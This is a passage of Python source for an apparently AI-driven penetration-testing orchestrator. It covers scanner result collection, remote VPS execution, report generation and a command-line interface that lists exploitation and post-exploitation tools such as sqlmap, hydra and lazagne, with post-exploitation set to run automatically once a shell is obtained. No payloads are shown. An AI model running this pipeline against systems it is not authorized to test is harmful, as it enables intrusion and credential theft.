                severity_map = {3: "high", 2: "medium", 1: "low", 0: "info"}
                alert_list = []
                for alert in alerts:
                    sev = severity_map.get(alert.risk, "info")
                    finding = Finding(
                        type="vulnerability",
                        value=alert.name,
                        description=alert.description or alert.name,
                        severity=sev,
                        phase="scan",
                        tool="zap",
                        target=alert.url,
                        metadata={"alert_id": alert.alert_id, "cwe_id": alert.cwe_id, "confidence": alert.confidence_name}
                    )
                    self._add_finding(finding)
                    findings_added.append(finding)
                    # Collect for JSON output
                    alert_list.append({
                        "alert_id": alert.alert_id,
                        "name": alert.name,
                        "severity": sev,
                        "risk": alert.risk,
                        "description": alert.description,
                        "url": alert.url,
                        "cwe_id": alert.cwe_id,
                        "confidence": alert.confidence_name
                    })

                if alerts:
                    print(f"    \033[92m✓ Found {len(alerts)} alerts\033[0m")
                else:
                    print(f"    \033[93m⚠ No alerts found yet (scan may still be running)\033[0m")

                # Always save zap_scan.json with current results
                zap_json_path = self.output_dir / "zap_scan.json"
                zap_data = {}
                if zap_json_path.exists():
                    try:
                        zap_data = json.loads(zap_json_path.read_text())
                    except json.JSONDecodeError:
                        pass
                zap_data["status"] = status.status if status.progress >= 100 else "running"
                zap_data["progress"] = status.progress
                zap_data["alerts"] = alert_list
                zap_data["alert_count"] = len(alert_list)
                zap_data["collected_at"] = datetime.now(timezone.utc).isoformat()
                zap_json_path.write_text(json.dumps(zap_data, indent=2))

                if status.progress >= 100 or status.status == "completed":
                    results_summary["completed"].append("zap")
                elif "zap" not in results_summary["still_running"]:
                    results_summary["still_running"].append("zap")

            except Exception as e:
                print(f"    \033[91m✗ Error: {e}\033[0m")
                results_summary["failed"].append({"scanner": "zap", "error": str(e)})

        # Summary
        results_summary["total_findings_added"] = len(findings_added)

        print(f"\n  {'─'*50}")
        print(f"  Scanners completed: {len(results_summary['completed'])}")
        print(f"  Scanners still running: {len(results_summary['still_running'])}")
        print(f"  Scanners failed: {len(results_summary['failed'])}")
        print(f"  Total new findings: \033[92m{len(findings_added)}\033[0m")
        print("="*width + "\n")

        # Save scanner results to file
        (self.output_dir / "scanner_results_summary.json").write_text(
            json.dumps(results_summary, indent=2), encoding="utf-8"
        )

        return results_summary

    # ==================== VPS INTEGRATION ====================

    async def _run_command_on_vps(
        self,
        command: str,
        timeout: int = 120
    ) -> tuple[int, str]:
        """
        Run a command on VPS instead of locally.

        Args:
            command: Command to execute
            timeout: Command timeout in seconds

        Returns:
            Tuple of (return_code, output)
        """
        if not VPS_AVAILABLE:
            logger.warning("VPS runtime not available, falling back to local execution")
            return await self._run_command(command, timeout)

        try:
            runtime = await get_vps_runtime()
            sandbox = await runtime.create_sandbox()

            try:
                stdout, stderr, code = await runtime.execute(
                    sandbox.sandbox_id,
                    command,
                    timeout=timeout
                )
                output = stdout if stdout else stderr
                return code, output
            finally:
                await runtime.destroy_sandbox(sandbox.sandbox_id)

        except Exception as e:
            logger.error(f"VPS execution failed: {e}, falling back to local")
            return await self._run_command(command, timeout)

    async def run_vps_scan(
        self,
        scan_type: str = "standard",
        tools: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Run a complete scan using VPS.

        This method runs tools on the VPS and retrieves results locally.

        Args:
            scan_type: Type of scan (quick, standard, full)
            tools: Specific tools to run

        Returns:
            Dict with scan results
        """
        if not VPS_AVAILABLE:
            raise RuntimeError("VPS runtime not available. Install asyncssh: pip install aiptx[full]")

        width = self._get_terminal_width() - 4
        print("\n" + "="*width)
        print("  🖥️  VPS REMOTE SCAN")
        print("="*width)

        try:
            runtime = await get_vps_runtime()
            print(f"  Connected to VPS: {runtime.host}")

            # Run scan on VPS
            results = await runtime.run_scan(
                target=self.target,
                scan_type=scan_type,
                tools=tools
            )

            print(f"  Scan completed: {results.get('completed_at', 'N/A')}")
            print(f"  Results stored: {results.get('local_results_path', 'N/A')}")

            # Parse VPS results into findings
            if results.get("tool_outputs"):
                for tool_name, tool_output in results["tool_outputs"].items():
                    stdout = tool_output.get("stdout", "")
                    if stdout:
                        # Parse tool-specific output
                        self._parse_vps_tool_output(tool_name, stdout)

            print("="*width + "\n")
            return results

        except Exception as e:
            logger.error(f"VPS scan failed: {e}")
            raise

    def _parse_vps_tool_output(self, tool_name: str, output: str) -> None:
        """Parse VPS tool output and add findings."""
        # Tool-specific parsing logic
        if tool_name == "nuclei" and output.strip():
            try:
                for line in output.strip().split("\n"):
                    if line.strip():
                        data = json.loads(line)
                        self._add_finding(Finding(
                            type="vulnerability",
                            value=data.get("info", {}).get("name", "Unknown"),
                            description=data.get("info", {}).get("description", ""),
                            severity=data.get("info", {}).get("severity", "info"),
                            phase="scan",
                            tool="nuclei_vps",
                            target=data.get("matched-at", self.target),
                            metadata={"template_id": data.get("template-id")}
                        ))
            except json.JSONDecodeError:
                pass

        elif tool_name == "nmap" and output.strip():
            # Parse nmap output for open ports
            import re
            port_pattern = re.compile(r'(\d+)/tcp\s+open\s+(\S+)')
            for match in port_pattern.finditer(output):
                port, service = match.groups()
                self._add_finding(Finding(
                    type="open_port",
                    value=f"{port}/{service}",
                    description=f"Open port {port} running {service}",
                    severity="info",
                    phase="scan",
                    tool="nmap_vps",
                    target=self.target
                ))

    # ==================== REPORT PHASE ====================

    async def run_report(self) -> PhaseResult:
        """Execute report generation phase."""
        phase = Phase.REPORT
        started_at = datetime.now(timezone.utc).isoformat()
        start_time = time.time()
        findings = []
        tools_run = []
        errors = []

        if self.on_phase_start:
            self.on_phase_start(phase)

        self._log_phase(phase, f"Generating Report for {self.domain}")

        # 1. Generate Summary
        summary = self._generate_summary()
        (self.output_dir / "SUMMARY.md").write_text(summary, encoding="utf-8")
        tools_run.append("summary_generator")
        self._log_tool("Summary generated", "done")

        # 2. Generate Findings JSON
        findings_data = [
            {
                "type": f.type,
                "value": f.value,
                "description": f.description,
                "severity": f.severity,
                "phase": f.phase,
                "tool": f.tool,
                "target": f.target,
                "metadata": f.metadata,
                "timestamp": f.timestamp
            }
            for f in self.findings
        ]
        (self.output_dir / "findings.json").write_text(json.dumps(findings_data, indent=2), encoding="utf-8")
        tools_run.append("findings_export")
        self._log_tool("Findings exported", "done")

        # 3. Generate HTML Report
        if self.config.report_format == "html":
            html_report = self._generate_html_report()
            report_file = self.output_dir / f"VAPT_Report_{self.domain.replace('.', '_')}.html"
            report_file.write_text(html_report, encoding="utf-8")
            tools_run.append("html_report")
            self._log_tool(f"HTML Report: {report_file.name}", "done")

        duration = time.time() - start_time
        result = PhaseResult(
            phase=phase,
            status="completed",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
            duration=duration,
            findings=findings,
            tools_run=tools_run,
            errors=errors,
            metadata={
                "output_dir": str(self.output_dir),
                "total_findings": len(self.findings)
            }
        )

        self.phase_results[phase] = result
        if self.on_phase_complete:
            self.on_phase_complete(result)

        return result

    def _generate_summary(self) -> str:
        """Generate markdown summary."""
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            # Handle severity as string, enum, or int
            sev = f.severity
            if hasattr(sev, "value"):
                sev = sev.value
            sev = str(sev).lower()
            if sev in severity_counts:
                severity_counts[sev] += 1

        phases_info = []
        for phase, result in self.phase_results.items():
            phases_info.append(f"| {phase.value.upper()} | {result.status} | {result.duration:.1f}s | {len(result.findings)} |")

        return f"""# AIPT Scan Summary

## Target Information
- **Domain**: {self.domain}
- **Target URL**: {self.target}
- **Scan Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- **Report ID**: VAPT-{self.domain.upper().replace('.', '-')}-{datetime.now().strftime('%Y%m%d')}

## Vulnerability Summary
| Severity | Count |
|----------|-------|
| 🔴 Critical | {severity_counts['critical']} |
| 🟠 High | {severity_counts['high']} |
| 🟡 Medium | {severity_counts['medium']} |
| 🔵 Low | {severity_counts['low']} |
| ⚪ Info | {severity_counts['info']} |
| **Total** | **{len(self.findings)}** |

## Phase Results
| Phase | Status | Duration | Findings |
|-------|--------|----------|----------|
{chr(10).join(phases_info)}

## Scanner IDs
{json.dumps(self.scan_ids, indent=2) if self.scan_ids else 'No enterprise scans'}

## Assets Discovered
- Subdomains: {len(self.subdomains)}
- Live Hosts: {len(self.live_hosts)}

## Output Directory
{self.output_dir}
"""

    def _get_finding_title(self, finding) -> str:
        """
        Generate a human-readable title for a finding.

        Bug fix: Previously used f.value which could be a number (e.g., "0" for subdomain_count).
        Now generates proper titles based on finding type.
        """
        # Map of finding types to title generators
        title_map = {
            "subdomain_count": lambda f: f"Subdomain Enumeration: {f.value} found",
            "live_hosts": lambda f: f"Live Hosts: {f.value} discovered",
            "open_port": lambda f: f"Open Port: {f.value}",
            "port": lambda f: f"Port {f.value}",
            "waf_bypass": lambda f: f.value if f.value and not f.value.isdigit() else "WAF Status",
            "waf_detected": lambda f: f.value if f.value else "WAF Detected",
            "ssl_vulnerability": lambda f: f.value,
            "missing_header": lambda f: f.value,
            "insecure_cookie": lambda f: f.value,
            "cors_misconfiguration": lambda f: f.value,
            "potential_vulnerability": lambda f: f.value,
            "certificate_info": lambda f: f.value,
            "attack_surface_analysis": lambda f: f"Attack Surface: {f.value}" if f.value else "Attack Surface Analysis",
        }

        finding_type = getattr(finding, 'type', '')

        # Use title map if available
        if finding_type in title_map:
            return title_map[finding_type](finding)

        # For other types, use value if it's descriptive (not just a number)
        value = getattr(finding, 'value', '')
        if value and not (value.isdigit() or value in ['0', '']):
            return value

        # Fallback: format type as title
        if finding_type:
            return finding_type.replace('_', ' ').title()

        return "Unknown Finding"

    def _generate_html_report(self) -> str:
        """Generate HTML report."""
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            # Handle severity as string, enum, or int
            sev = f.severity
            if hasattr(sev, "value"):
                sev = sev.value
            sev = str(sev).lower()
            if sev in severity_counts:
                severity_counts[sev] += 1

        findings_html = ""
        for f in self.findings:
            # Handle severity as string, enum, or int
            sev = f.severity
            if hasattr(sev, "value"):
                sev = sev.value
            sev_class = str(sev).lower()
            sev_upper = str(sev).upper()

            # Generate proper title from finding type and value
            # Bug fix: f.value may be a numeric count (e.g., "0" for subdomain_count)
            # Use type + value for meaningful titles, or value alone if it's descriptive
            finding_title = self._get_finding_title(f)

            findings_html += f"""
            <div class="finding {sev_class}">
                <div class="finding-header">
                    <span class="severity-badge {sev_class}">{sev_upper}</span>
                    <span class="finding-title">{finding_title}</span>
                    <span class="finding-tool">{f.tool}</span>
                </div>
                <div class="finding-body">
                    <p>{f.description}</p>
                    <small>Target: {f.target or self.target} | Phase: {f.phase}</small>
                </div>
            </div>
            """

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VAPT Report - {self.domain}</title>
    <style>
        :root {{
            --critical: #dc3545;
            --high: #fd7e14;
            --medium: #ffc107;
            --low: #17a2b8;
            --info: #6c757d;
        }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px; border-radius: 10px; margin-bottom: 30px; }}
        .header h1 {{ margin: 0 0 10px 0; }}
        .stats {{ display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; margin-bottom: 30px; }}
        .stat {{ background: white; padding: 20px; border-radius: 10px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .stat .number {{ font-size: 2em; font-weight: bold; }}
        .stat.critical .number {{ color: var(--critical); }}
        .stat.high .number {{ color: var(--high); }}
        .stat.medium .number {{ color: var(--medium); }}
        .stat.low .number {{ color: var(--low); }}
        .stat.info .number {{ color: var(--info); }}
        .findings {{ background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .finding {{ border-left: 4px solid; padding: 15px; margin-bottom: 15px; background: #fafafa; border-radius: 0 5px 5px 0; }}
        .finding.critical {{ border-color: var(--critical); }}
        .finding.high {{ border-color: var(--high); }}
        .finding.medium {{ border-color: var(--medium); }}
        .finding.low {{ border-color: var(--low); }}
        .finding.info {{ border-color: var(--info); }}
        .finding-header {{ display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }}
        .severity-badge {{ padding: 3px 8px; border-radius: 3px; font-size: 0.8em; color: white; }}
        .severity-badge.critical {{ background: var(--critical); }}
        .severity-badge.high {{ background: var(--high); }}
        .severity-badge.medium {{ background: var(--medium); }}
        .severity-badge.low {{ background: var(--low); }}
        .severity-badge.info {{ background: var(--info); }}
        .finding-title {{ font-weight: bold; flex-grow: 1; }}
        .finding-tool {{ color: #666; font-size: 0.9em; }}
        .finding-body p {{ margin: 0 0 10px 0; }}
        .finding-body small {{ color: #666; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 VAPT Report</h1>
            <p><strong>Target:</strong> {self.domain}</p>
            <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Report ID:</strong> VAPT-{self.domain.upper().replace('.', '-')}-{datetime.now().strftime('%Y%m%d')}</p>
        </div>

        <div class="stats">
            <div class="stat critical"><div class="number">{severity_counts['critical']}</div><div>Critical</div></div>
            <div class="stat high"><div class="number">{severity_counts['high']}</div><div>High</div></div>
            <div class="stat medium"><div class="number">{severity_counts['medium']}</div><div>Medium</div></div>
            <div class="stat low"><div class="number">{severity_counts['low']}</div><div>Low</div></div>
            <div class="stat info"><div class="number">{severity_counts['info']}</div><div>Info</div></div>
        </div>

        <div class="findings">
            <h2>Findings ({len(self.findings)})</h2>
            {findings_html if findings_html else '<p>No vulnerabilities found.</p>'}
        </div>

        <div style="text-align: center; margin-top: 30px; color: #666;">
            <p>Generated by AIPT - AI-Powered Penetration Testing</p>
            <p>Scanners: {', '.join(self.scan_ids.keys()) if self.scan_ids else 'Open Source Tools'}</p>
        </div>
    </div>
</body>
</html>"""

    # ==================== MAIN RUNNER ====================

    async def run(self, phases: Optional[List[Phase]] = None) -> Dict[str, Any]:
        """
        Run the full orchestration pipeline.

        Args:
            phases: Optional list of phases to run (default: all)

        Returns:
            Complete results dictionary
        """
        if phases is None:
            phases = [Phase.RECON, Phase.SCAN, Phase.ANALYZE, Phase.EXPLOIT, Phase.POST_EXPLOIT, Phase.REPORT]

        start_time = time.time()

        print("\n" + "="*60)
        print("  AIPT - AI-Powered Penetration Testing (v2.1 - Maximum Tools)")
        print("="*60)
        print(f"  Target: {self.domain}")
        print(f"  Output: {self.output_dir}")
        print(f"  Mode: {'FULL (All Tools)' if self.config.full_mode else 'Standard'}")
        print(f"  Intelligence: {'Enabled' if self.config.enable_intelligence else 'Disabled'}")
        print(f"  Acunetix: {'Enabled' if self.config.use_acunetix else 'Disabled'}")
        print(f"  Burp: {'Enabled' if self.config.use_burp else 'Disabled'}")
        print(f"  Nessus: {'Enabled' if self.config.use_nessus else 'Disabled'}")
        print(f"  ZAP: {'Enabled' if self.config.use_zap else 'Disabled'}")
        print(f"  ZoomEye: {'Enabled' if self.config.use_zoomeye else 'Disabled'}")
        print(f"  VPS: {'Enabled' if self.config.use_vps else 'Local'}")
        print(f"  Exploitation: {'Enabled' if (self.config.full_mode or self.config.enable_exploitation) else 'Disabled'}")
        print(f"  Final Scanner Collection: {'Enabled' if self.config.collect_scanner_results_at_end else 'Disabled'}")
        print("="*60 + "\n")

        # Time estimate warning for --full mode
        if self.config.full_mode and self.config.wait_for_scanners:
            print("\033[1;33m" + "="*60)
            print("  ⚠️  FULL MODE - ESTIMATED TIME: 60-90 MINUTES")
            print("="*60 + "\033[0m")
            print("  Enterprise scanners (Acunetix, Nessus, Burp, ZAP) run in")
            print("  background. Partial results collected if they timeout.")
            print("  Use \033[1m--quick\033[0m for faster scans without enterprise scanners.")
            print("="*60 + "\n")

        # Initialize live findings panel for real-time updates
        self._scan_start_time = time.time()
        estimated_duration = 3600 if self.config.wait_for_scanners else 1800
        self._live_panel = LiveFindingsPanel(estimated_duration=estimated_duration)

        # Hook up the live panel to capture findings
        original_on_finding = self.on_finding
        def live_panel_finding_callback(finding):
            if self._live_panel:
                self._live_panel.add_finding(finding)
            if original_on_finding:
                original_on_finding(finding)
        self.on_finding = live_panel_finding_callback

        # Hook up the live panel to capture phase changes
        original_on_phase_start = self.on_phase_start
        def live_panel_phase_callback(phase):
            if self._live_panel:
                self._live_panel.set_current_phase(phase.value.upper())
            if original_on_phase_start:
                original_on_phase_start(phase)
        self.on_phase_start = live_panel_phase_callback

        # Hook up the live panel to show status after phase completion
        original_on_phase_complete = self.on_phase_complete
        def live_panel_phase_complete_callback(result):
            # Show live status after each phase (compact format)
            if self._live_panel:
                self._print_live_status()
            if original_on_phase_complete:
                original_on_phase_complete(result)
        self.on_phase_complete = live_panel_phase_complete_callback

        try:
            if Phase.RECON in phases and not self.config.skip_recon:
                await self.run_recon()

            if Phase.SCAN in phases and not self.config.skip_scan:
                await self.run_scan()

            # NEW: Intelligence Analysis Phase
            if Phase.ANALYZE in phases and self.config.enable_intelligence:
                await self.run_analyze()

            if Phase.EXPLOIT in phases and not self.config.skip_exploit:
                await self.run_exploit()

            # Auto-trigger POST_EXPLOIT if shell was obtained
            if Phase.POST_EXPLOIT in phases and self.config.shell_obtained:
                await self.run_post_exploit()

            # Collect final scanner results before report generation
            if self.scan_ids and self.config.collect_scanner_results_at_end:
                await self._collect_final_scanner_results()

            if Phase.REPORT in phases and not self.config.skip_report:
                await self.run_report()

        except Exception as e:
            logger.exception(f"Orchestration error: {e}")
            raise

        total_duration = time.time() - start_time

        # Final summary - categorized findings with full terminal width
        width = self._get_terminal_width() - 4  # Leave small margin
        print("\n" + "="*width)
        print("  \033[1;32m✓ SCAN COMPLETE\033[0m")
        print("="*width)

        # Show live findings panel summary
        if self._live_panel and self._live_panel.get_total_count() > 0:
            print()
            self._print_live_panel()

        # Show categorized findings summary
        if self.findings:
            # Group findings by type - include all vulnerability-related types
            vuln_types = (
                "vulnerability", "cve", "web_vulnerability", "ssl_vulnerability",
                "wordpress_vulnerability", "container_vulnerability", "xss_vulnerability",
                "exposed_endpoint", "exposed_git", "sqli_vulnerability", "credential_found",
                "sensitive_exposure", "misconfig", "weak_cipher", "waf_bypass",
                "potential_exploit", "secret", "verified_secret"
            )
            vuln_findings = [f for f in self.findings if f.type in vuln_types or "vuln" in f.type.lower() or "exploit" in f.type.lower() or "exposed" in f.type.lower()]
            subdomain_findings = [f for f in self.findings if f.type == "subdomain"]
            port_findings = [f for f in self.findings if f.type in ("port", "open_port")]
            other_findings = [f for f in self.findings if f.type not in vuln_types and f.type not in ("subdomain", "port", "open_port", "subdomain_count", "discovered_host") and "vuln" not in f.type.lower()]

            # Helper to safely get severity string
            def get_sev(f):
                sev = f.severity
                if hasattr(sev, "value"):
                    sev = sev.value
                return str(sev).lower()

            # Vulnerabilities section (most important)
            if vuln_findings:
                critical = [f for f in vuln_findings if get_sev(f) == "critical"]
                high = [f for f in vuln_findings if get_sev(f) == "high"]
                medium = [f for f in vuln_findings if get_sev(f) == "medium"]
                low = [f for f in vuln_findings if get_sev(f) == "low"]

                print(f"\n  \033[1m🔴 VULNERABILITIES ({len(vuln_findings)})\033[0m")
                if critical:
                    print(f"    \033[91m• Critical: {len(critical)}\033[0m")
                    for v in critical[:3]:
                        print(f"      → {v.value}")
                if high:
                    print(f"    \033[31m• High: {len(high)}\033[0m")
                    for v in high[:3]:
                        print(f"      → {v.value}")
                if medium:
                    print(f"    \033[33m• Medium: {len(medium)}\033[0m")
                if low:
                    print(f"    \033[90m• Low: {len(low)}\033[0m")

            # Subdomains section
            if self.subdomains:
                print(f"\n  \033[1m🌐 SUBDOMAINS ({len(self.subdomains)})\033[0m")
                for sub in sorted(self.subdomains)[:10]:
                    print(f"    • {sub}")
                if len(self.subdomains) > 10:
                    print(f"    \033[90m... and {len(self.subdomains) - 10} more\033[0m")

            # Open ports section
            if self.open_ports:
                print(f"\n  \033[1m🔓 OPEN PORTS ({len(self.open_ports)})\033[0m")
                for port in sorted(self.open_ports)[:10]:
                    print(f"    • {port}")

        print(f"\n  Duration: {total_duration:.1f}s")
        if self.attack_chains:
            print(f"  Attack Chains: {len(self.attack_chains)}")
        print(f"  Output: {self.output_dir}")
        print("="*width + "\n")

        return {
            "target": self.target,
            "domain": self.domain,
            "duration": total_duration,
            "phases": {p.value: r.__dict__ for p, r in self.phase_results.items()},
            "findings_count": len(self.findings),
            "attack_chains_count": len(self.attack_chains),
            "scan_ids": self.scan_ids,
            "output_dir": str(self.output_dir)
        }


# ==================== CLI ====================

async def main():
    """CLI entry point."""
    import argparse

    parser = argparse.ArgumentParser(
        description="AIPT Orchestrator - Full Penetration Testing Pipeline (v2.1 - Maximum Tools)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  aiptx scan example.com                    # Standard scan
  aiptx scan example.com --full             # Full scan with exploitation tools
  aiptx scan example.com --full --exploit   # Enable all exploitation
  aiptx scan example.com --nessus --zap     # With enterprise scanners
  aiptx scan example.com --zoomeye          # With ZoomEye passive intelligence
  aiptx scan example.com --wait             # Wait for enterprise scanners to complete
  aiptx scan example.com --vps              # Run tools on VPS (requires VPS config)

Tools included:
  INTEL:   ZoomEye (--zoomeye) - Passive cyberspace recon for related IPs, domains, services
  RECON:   subfinder, assetfinder, amass, nmap, waybackurls, theHarvester, dnsrecon, wafw00f, whatweb
  SCAN:    nuclei, ffuf, sslscan, nikto, wpscan, testssl, gobuster, dirsearch
  EXPLOIT: sqlmap, commix, xsstrike, hydra, searchsploit (--full mode)
  POST:    linpeas, winpeas, pspy, lazagne (auto-triggers on shell access)
  VPS:     Remote execution via SSH (requires 'aiptx setup' configuration)

Scanner Result Collection:
  By default, enterprise scanner results are collected just before report generation.
  Use --wait to wait for all scanners to complete before collection.
  Use --no-final-scan-results to skip final collection (results from in-progress scans only).
        """
    )

    # Target
    parser.add_argument("target", help="Target domain or URL")
    parser.add_argument("-o", "--output", default="./scan_results", help="Output directory")

    # Scan modes
    parser.add_argument("--full", action="store_true",
                       help="Enable FULL mode with all tools including exploitation")
    parser.add_argument("--exploit", action="store_true",
                       help="Enable exploitation tools (sqlmap, hydra, commix)")

    # Phase control
    parser.add_argument("--skip-recon", action="store_true", help="Skip reconnaissance phase")
    parser.add_argument("--skip-scan", action="store_true", help="Skip scanning phase")
    parser.add_argument("--skip-exploit", action="store_true", help="Skip exploitation phase")

    # Enterprise scanners
    parser.add_argument("--no-acunetix", action="store_true", help="Disable Acunetix")
    parser.add_argument("--no-burp", action="store_true", help="Disable Burp Suite")
    parser.add_argument("--nessus", action="store_true", help="Enable Nessus scanner")
    parser.add_argument("--zap", action="store_true", help="Enable OWASP ZAP scanner")
    parser.add_argument("--zoomeye", action="store_true", help="Enable ZoomEye intelligence recon")
    parser.add_argument("--wait", action="store_true", help="Wait for enterprise scanners to complete")
    parser.add_argument("--acunetix-profile", default="full",
                       choices=["full", "high_risk", "xss", "sqli"],
                       help="Acunetix scan profile")

    # SQLMap settings
    parser.add_argument("--sqlmap-level", type=int, default=2,
                       help="SQLMap testing level (1-5, default: 2)")
    parser.add_argument("--sqlmap-risk", type=int, default=2,
                       help="SQLMap risk level (1-3, default: 2)")

    # DevSecOps
    parser.add_argument("--container", action="store_true",
                       help="Enable container security scanning (trivy)")
    parser.add_argument("--secrets", action="store_true",
                       help="Enable secret detection (gitleaks, trufflehog)")

    # VPS Remote Execution
    parser.add_argument("--vps", action="store_true",
                       help="Run tools on VPS instead of locally")
    parser.add_argument("--no-final-scan-results", action="store_true",
                       help="Disable final scanner result collection before report")

    # Authentication Options
    auth_group = parser.add_argument_group('Authentication', 'Options for authenticated scanning')
    auth_group.add_argument("--auth-token", type=str,
                           help="Bearer token for API authentication")
    auth_group.add_argument("--auth-user", type=str,
                           help="Username for form-based or basic authentication")
    auth_group.add_argument("--auth-pass", type=str,
                           help="Password for form-based or basic authentication")
    auth_group.add_argument("--auth-url", type=str,
                           help="Login URL for form-based authentication")
    auth_group.add_argument("--auth-cookie", type=str,
                           help="Session cookie (format: 'name=value' or 'name1=val1;name2=val2')")
    auth_group.add_argument("--auth-header", type=str, action="append",
                           help="Custom auth header (format: 'Header-Name: value'), can be repeated")

    args = parser.parse_args()

    # Build auth credentials from CLI args
    auth_credentials = None
    if args.auth_token:
        # Bearer token auth
        auth_credentials = AuthCredentials(
            method=AuthMethod.BEARER_TOKEN,
            token=args.auth_token,
        )
        print(f"[*] Using Bearer token authentication")
    elif args.auth_url and args.auth_user and args.auth_pass:
        # Form-based login
        auth_credentials = AuthCredentials(
            method=AuthMethod.FORM_LOGIN,
            login_url=args.auth_url,
            login_data={"username": args.auth_user, "password": args.auth_pass},
        )
        print(f"[*] Using form-based authentication at {args.auth_url}")
    elif args.auth_user and args.auth_pass:
        # Basic auth
        auth_credentials = AuthCredentials(
            method=AuthMethod.BASIC_AUTH,
            username=args.auth_user,
            password=args.auth_pass,
        )
        print(f"[*] Using HTTP Basic authentication")
    elif args.auth_cookie:
        # Cookie auth
        cookies = {}
        for pair in args.auth_cookie.split(';'):
            if '=' in pair:
                name, value = pair.strip().split('=', 1)
                cookies[name] = value
        auth_credentials = AuthCredentials(
            method=AuthMethod.COOKIE,
            cookies=cookies,
        )
        print(f"[*] Using cookie authentication ({len(cookies)} cookies)")
    elif args.auth_header:
        # Custom headers
        headers = {}
        for header in args.auth_header:
            if ':' in header:
                name, value = header.split(':', 1)
                headers[name.strip()] = value.strip()
        auth_credentials = AuthCredentials(
            method=AuthMethod.CUSTOM_HEADER,
            custom_headers=headers,
        )
        print(f"[*] Using custom header authentication ({len(headers)} headers)")

    config = OrchestratorConfig(
        target=args.target,
        output_dir=args.output,
        full_mode=args.full,
        skip_recon=args.skip_recon,
        skip_scan=args.skip_scan,
        skip_exploit=args.skip_exploit,
        use_acunetix=not args.no_acunetix,
        use_burp=not args.no_burp,
        use_nessus=args.nessus,
        use_zap=args.zap,
        use_zoomeye=args.zoomeye,
        wait_for_scanners=args.wait,
        acunetix_profile=args.acunetix_profile,
        enable_exploitation=args.exploit or args.full,
        sqlmap_level=args.sqlmap_level,
        sqlmap_risk=args.sqlmap_risk,
        enable_container_scan=args.container,
        enable_secret_detection=args.secrets,
        use_vps=args.vps,
        collect_scanner_results_at_end=not args.no_final_scan_results,
        auth_credentials=auth_credentials,
    )

    orchestrator = Orchestrator(args.target, config)
    results = await orchestrator.run()

    # Summary
    print(f"\n{'='*60}")
    print(f"  ✓ SCAN COMPLETE - {results['findings_count']} findings")
    print(f"{'='*60}")
    print(f"  Output: {results['output_dir']}")
    print(f"  Duration: {results['duration']:.1f}s")
    if config.full_mode:
        print(f"  Mode: FULL (All exploitation tools enabled)")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    asyncio.run(main())
